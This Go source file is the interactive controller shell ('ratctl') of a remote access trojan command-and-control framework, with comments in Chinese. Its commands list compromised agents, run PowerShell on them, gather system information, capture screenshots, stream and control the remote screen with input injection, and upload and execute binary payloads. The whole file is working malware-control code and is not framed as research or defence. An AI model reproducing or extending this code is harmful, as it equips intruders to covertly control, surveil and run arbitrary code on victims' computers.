// repl.go — ratctl 交互式 shell：REPL 循环与命令实现
package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
	"strings"

	"ratc2/internal/protocol"
)

// repl 主循环：读一行 → 解析 → 分发。
func (st *shellState) repl() {
	r := bufio.NewReader(os.Stdin)
	for {
		st.printPrompt()
		line, err := r.ReadString('\n')
		if err != nil {
			break // EOF（exit / Ctrl+D）
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if !st.dispatch(line) {
			break
		}
	}
	fmt.Println()
}

func (st *shellState) printPrompt() {
	st.curMu.Lock()
	cur := st.cur
	st.curMu.Unlock()
	if cur == "" {
		fmt.Print("ratctl> ")
	} else {
		fmt.Printf("ratctl[%s]> ", shortID(cur))
	}
}

// dispatch 执行一条命令；返回 false 表示退出 REPL。
func (st *shellState) dispatch(line string) bool {
	fields := strings.Fields(line)
	cmd := strings.ToLower(fields[0])
	args := fields[1:]
	rest := ""
	if i := strings.Index(line, " "); i >= 0 {
		rest = strings.TrimSpace(line[i+1:])
	}

	switch cmd {
	case "sessions", "list":
		st.cmdSessions()
	case "use":
		if len(args) < 1 {
			fmt.Println("usage: use <agent_id>")
		} else {
			st.cmdUse(args[0])
		}
	case "back":
		st.curMu.Lock()
		st.cur = ""
		st.curMu.Unlock()
	case "session", "info":
		if len(args) < 1 {
			fmt.Println("usage: session <agent_id>")
		} else {
			st.cmdSession(args[0])
		}
	case "kill":
		if len(args) < 1 {
			fmt.Println("usage: kill <agent_id>")
		} else {
			st.cmdKill(args[0])
		}
	case "sysinfo":
		st.cmdSysinfo()
	case "exec":
		if rest == "" {
			fmt.Println("usage: exec <powershell command>")
		} else {
			st.cmdExec(rest)
		}
	case "screenshot", "shot":
		switch len(args) {
		case 1:
			st.cmdScreenshot("", args[0])
		case 2:
			st.cmdScreenshot(args[0], args[1])
		default:
			fmt.Println("usage: screenshot [agent_id] <local_file>")
		}
	case "screen", "viewer":
		st.cmdScreen(args)
	case "stop":
		st.cmdStopStream()
	case "payload", "pload":
		if rest == "" {
			fmt.Println("usage: payload <local_file> [remote_name] [--args <命令行参数>]")
		} else {
			st.cmdPayload(rest)
		}
	case "raw":
		st.cmdRaw(args)
	case "help", "?":
		printHelp()
	case "exit", "quit":
		return false
	default:
		fmt.Printf("unknown command: %s (type 'help')\n", cmd)
	}
	return true
}

// resolveAgent 把 id 前缀**或模块标签**解析为完整 agent id。
//
//	· 先按 id 前缀匹配（原行为）；
//	· 未命中时刷新一次会话表再试；
//	· 仍未命中则按**模块标签**匹配：会话的 os 形如 "Windows (screen)"，
//	  标签就是括号里的模块名（模块化后一台机器上会有多个模块 agent，
//	  用 `use screen` / `screen screen` 比手抄 32 位 id 方便）。
//	  标签必须**唯一命中**：多台机器都跑同名模块时打印候选，让用户改用 id 前缀。
func (st *shellState) resolveAgent(prefix string) (string, bool) {
	if prefix == "" {
		return "", false
	}
	if id, ok := matchIDPrefix(st.sessions, prefix); ok {
		return id, true
	}
	_, body, err := st.sendAndWait(protocol.CtlList, protocol.PluginCtl, nil,
		protocol.CtlList, waitTimeout)
	if err == nil {
		if sessions, derr := decodeSessions(body); derr == nil {
			st.sessions = sessions
			if id, ok := matchIDPrefix(sessions, prefix); ok {
				return id, true
			}
			return matchModuleTag(sessions, prefix)
		}
	}
	return "", false
}

// matchIDPrefix 按 agent_id 前缀匹配。
func matchIDPrefix(sessions []SessionInfo, prefix string) (string, bool) {
	for _, s := range sessions {
		if strings.HasPrefix(s.ID, prefix) {
			return s.ID, true
		}
	}
	return "", false
}

// matchModuleTag 按模块标签（os 里的 "(<module>)"）匹配，要求唯一命中。
func matchModuleTag(sessions []SessionInfo, tag string) (string, bool) {
	needle := "(" + tag + ")"
	var hits []SessionInfo
	for _, s := range sessions {
		if strings.Contains(s.OS, needle) {
			hits = append(hits, s)
		}
	}
	if len(hits) == 1 {
		return hits[0].ID, true
	}
	if len(hits) > 1 {
		fmt.Printf("[!] 模块 %q 有 %d 个会话，请用 id 前缀指定：\n", tag, len(hits))
		for _, s := range hits {
			fmt.Printf("      %s  %s  %s\n", s.ID[:8], s.IP, s.OS)
		}
	}
	return "", false
}

// cmdSessions 列出在线 Agent（并缓存列表供 use 校验）。
func (st *shellState) cmdSessions() {
	_, body, err := st.sendAndWait(protocol.CtlList, protocol.PluginCtl, nil,
		protocol.CtlList, waitTimeout)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	sessions, err := decodeSessions(body)
	if err != nil {
		fmt.Printf("[!] decode sessions: %v\n", err)
		return
	}
	st.sessions = sessions

	if len(sessions) == 0 {
		fmt.Println("(no agents online)")
		return
	}
	fmt.Printf("%-34s %-15s %-6s %-24s %-10s %s\n",
		"AGENT ID", "IP", "PORT", "OS", "LAST SEEN", "ONLINE")
	for _, s := range sessions {
		online := "yes"
		if !s.Online {
			online = "no"
		}
		fmt.Printf("%-34s %-15s %-6d %-24s %-10s %s\n",
			s.ID, s.IP, s.Port, trunc(s.OS, 23),
			s.LastSeen.Format("15:04:05"), online)
	}
}

// cmdUse 切换当前 Agent（id 需在最近 sessions 列表中存在）。
func (st *shellState) cmdUse(id string) {
	full, ok := st.resolveAgent(id)
	if !ok {
		fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", id)
		return
	}
	st.curMu.Lock()
	st.cur = full
	st.curMu.Unlock()
	for _, s := range st.sessions {
		if s.ID == full {
			fmt.Printf("[*] switched to agent %s (os=%s)\n", full, trunc(s.OS, 40))
			return
		}
	}
	fmt.Printf("[*] switched to agent %s\n", full)
}

// cmdSession 查看单个 Agent 的会话详情（CTL_GET_SESSION，协议 §3.3）。
func (st *shellState) cmdSession(prefix string) {
	id, ok := st.resolveAgent(prefix)
	if !ok {
		fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", prefix)
		return
	}
	// 注意：CTL_GET_SESSION 的 payload 是 agent_id 的 hex 字符串（C2 会话表按 hex 字符串索引）
	_, body, err := st.sendAndWait(protocol.CtlGetSession, protocol.PluginCtl,
		[]byte(id), protocol.CtlGetSession, waitTimeout)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	sessions, err := decodeSessions(body)
	if err != nil || len(sessions) == 0 {
		fmt.Printf("[!] decode session: %v\n", err)
		return
	}
	s := sessions[0]
	online := "no"
	if s.Online {
		online = "yes"
	}
	fmt.Printf("agent_id : %s\n", s.ID)
	fmt.Printf("ip:port  : %s:%d\n", s.IP, s.Port)
	fmt.Printf("os       : %s\n", s.OS)
	fmt.Printf("plugins  : 0x%08x\n", s.Plugins)
	fmt.Printf("last_seen: %s\n", s.LastSeen.Format("2006-01-02 15:04:05"))
	fmt.Printf("online   : %s\n", online)
}

// cmdKill 踢指定 Agent 下线（CTL_KILL_SESSION）。
func (st *shellState) cmdKill(prefix string) {
	id, ok := st.resolveAgent(prefix)
	if !ok {
		fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", prefix)
		return
	}
	_, _, err := st.sendAndWait(protocol.CtlKillSession, protocol.PluginCtl,
		[]byte(id), protocol.CtlKillSession, waitTimeout)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	st.curMu.Lock()
	if st.cur == id {
		st.cur = ""
	}
	st.curMu.Unlock()
	fmt.Printf("[*] session killed: %s\n", id)
}

// cmdSysinfo 收集当前 Agent 系统信息。
func (st *shellState) cmdSysinfo() {
	status, text, err := st.execBusiness(protocol.CmdSysInfo, protocol.PluginSys, nil)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if status != protocol.StatusOK {
		fmt.Printf("[!] agent status=%d: %s\n", status, text)
		return
	}
	fmt.Print(text)
	if len(text) > 0 && text[len(text)-1] != '\n' {
		fmt.Println()
	}
}

// cmdExec 在当前 Agent 执行 PowerShell 命令。
func (st *shellState) cmdExec(command string) {
	status, text, err := st.execBusiness(protocol.CmdExecPs, protocol.PluginSys, []byte(command))
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if status != protocol.StatusOK {
		fmt.Printf("[!] agent status=%d: %s\n", status, text)
		return
	}
	fmt.Print(text)
	if len(text) > 0 && text[len(text)-1] != '\n' {
		fmt.Println()
	}
}

// cmdScreenshot 远程截屏并存盘（0x1001，响应为 JPEG 原始字节）。
// idPrefix 为空时使用当前选中的 Agent。
func (st *shellState) cmdScreenshot(idPrefix, localFile string) {
	agentID := ""
	if idPrefix == "" {
		cur, err := st.currentAgentIDHex()
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return
		}
		agentID = cur
	} else {
		id, ok := st.resolveAgent(idPrefix)
		if !ok {
			fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", idPrefix)
			return
		}
		agentID = id
	}
	fmt.Printf("[*] capturing screen from %s ...\n", shortID(agentID))
	status, body, err := st.businessRawTo(agentID, protocol.CmdScreenshot,
		protocol.PluginRemote, nil, waitTimeout)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if status != protocol.StatusOK {
		fmt.Printf("[!] agent status=%d: %s\n", status, trunc(string(body), 200))
		return
	}
	if err := os.WriteFile(localFile, body, 0o644); err != nil {
		fmt.Printf("[!] write %s: %v\n", localFile, err)
		return
	}
	fmt.Printf("[*] screenshot saved: %s (%d bytes)\n", localFile, len(body))
}

// cmdScreen 拉起 viewer 显示远程屏幕（viewer 自己发起 0x1002 屏幕流）。
// 用法：screen [agent_id] [fps] [quality] [scale]
// 说明：屏幕流必须由发起 0x1002 的那条 ctl 连接接收（C2 按连接配对），
//       因此这里只负责启动 viewer，流由 viewer 自己的连接建立。
func (st *shellState) cmdScreen(args []string) {
	agentID := ""
	params := args
	if len(args) > 0 && !isNumeric(args[0]) {
		id, ok := st.resolveAgent(args[0])
		if !ok {
			fmt.Printf("[!] agent %q not found (run 'sessions' first)\n", args[0])
			return
		}
		agentID = id
		params = args[1:]
	} else {
		cur, err := st.currentAgentIDHex()
		if err != nil {
			fmt.Println("usage: screen [agent_id] [fps] [quality] [scale]  （需先 use <id>）")
			return
		}
		agentID = cur
	}

	fps, quality, scale := 25, 70, 100
	if len(params) > 0 {
		fps = atoiOr(params[0], fps)
	}
	if len(params) > 1 {
		quality = atoiOr(params[1], quality)
	}
	if len(params) > 2 {
		scale = atoiOr(params[2], scale)
	}
	if fps <= 0 || fps > 60 {
		fps = 25
	}
	if quality <= 0 || quality > 100 {
		quality = 70
	}
	if scale <= 0 || scale > 100 {
		scale = 100
	}
	fmt.Printf("[*] launching viewer for %s (fps=%d quality=%d scale=%d%%) ...\n",
		shortID(agentID), fps, quality, scale)
	if err := st.launchViewer(agentID, fps, quality, scale); err != nil {
		fmt.Printf("[!] %v\n", err)
	}
}

// cmdStopStream 停止当前 Agent 的屏幕流（0x1002 control=0，兜底清理 viewer 异常退出）。
func (st *shellState) cmdStopStream() {
	// payload（去掉 agent_id 前缀后）：控制(1B) + fps + quality + scale
	args := []byte{0, 25, 70, 100}
	status, text, err := st.execBusiness(protocol.CmdScreenStream, protocol.PluginRemote, args)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if status != protocol.StatusOK {
		fmt.Printf("[!] agent status=%d: %s\n", status, trunc(text, 200))
		return
	}
	fmt.Printf("[*] %s\n", strings.TrimSpace(text))
}

func isNumeric(s string) bool {
	if s == "" {
		return false
	}
	_, err := strconv.Atoi(s)
	return err == nil
}

func atoiOr(s string, def int) int {
	n, err := strconv.Atoi(s)
	if err != nil {
		return def
	}
	return n
}

// pluginForCmd 按指令码段推断 plugin 字段（协议 §3：0x1xxx 远程 / 0x2xxx 文件 / 0x3xxx 系统）。
// C2 目前只按 cmd 路由，但填对 plugin 才不会在后续插件化时踩坑。
func pluginForCmd(cmd uint16) uint8 {
	switch cmd >> 12 {
	case 0x1:
		return protocol.PluginRemote
	case 0x2:
		return protocol.PluginFile
	case 0x3:
		return protocol.PluginSys
	default:
		return protocol.PluginCore
	}
}

// isPrintableText 判断响应是否为可见文本（否则按 hex 打印，避免把 JPEG 糊到终端上）。
func isPrintableText(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c == '\r' || c == '\n' || c == '\t' {
			continue
		}
		if c < 0x20 || c > 0x7e {
			return false
		}
	}
	return true
}

// cmdRaw 发送任意业务指令并打印原始响应 —— 用来测**新模块自己的指令**
// （模块只需在 caps.cpp 里登记指令码，这里就能直接打过去）：
//
//	raw <cmd_hex> [payload_hex]     例: raw 2001 deadbeef
func (st *shellState) cmdRaw(args []string) {
	if len(args) < 1 {
		fmt.Println("usage: raw <cmd_hex> [payload_hex]   (例: raw 2001 deadbeef)")
		return
	}
	cmd64, err := strconv.ParseUint(strings.TrimPrefix(args[0], "0x"), 16, 16)
	if err != nil {
		fmt.Printf("[!] bad cmd %q: %v\n", args[0], err)
		return
	}
	var payload []byte
	if len(args) > 1 {
		payload, err = hex.DecodeString(args[1])
		if err != nil {
			fmt.Printf("[!] bad payload hex: %v\n", err)
			return
		}
	}
	cmd := uint16(cmd64)
	status, body, err := st.execBusiness(cmd, pluginForCmd(cmd), payload)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("cmd    : 0x%04x (plugin=0x%02x)\n", cmd, pluginForCmd(cmd))
	fmt.Printf("status : 0x%02x\n", status)
	if isPrintableText(body) {
		fmt.Printf("text   : %s\n", body)
	} else {
		h := hex.EncodeToString([]byte(body))
		if len(h) > 128 {
			h = h[:128] + "..."
		}
		fmt.Printf("binary : %d bytes, hex=%s\n", len(body), h)
	}
}

func printHelp() {
	fmt.Println(`ratctl - C2 交互式控制端

会话管理:
  sessions                  列出在线 Agent
  use <agent_id|模块名>      切换到目标 Agent（支持 id 前缀；也可用模块名如 use screen）
  back                      退出当前 Agent
  session <agent_id>        查看单个会话详情
  kill <agent_id>           踢 Agent 下线（关闭其连接）

当前 Agent 操作（需先 use，或直接给出 agent_id）:
  sysinfo                   收集系统信息
  exec <command>            执行 PowerShell 命令
  screenshot [id] <file>    远程截屏并保存为 JPEG 文件
  screen [id] [fps] [quality] [scale]   拉起 viewer 查看/操作远程屏幕
                            （默认 25 70 100；viewer 负责建流与键鼠注入）
  stop                      停止当前 Agent 的屏幕流
  payload <file> [name] [--args <参数>]
                            上传本地二进制 payload 到 Agent 并执行（协议 §10）
  raw <cmd_hex> [payload_hex]  发送任意业务指令并打印原始响应
                            （用于测试**新模块自己的指令**，如 raw 2001 deadbeef）

通用:
  help / ?                  显示本帮助
  exit / quit               退出

全局参数: ratctl [-s host:port] [-viewer <viewer.exe 路径>]`)
}
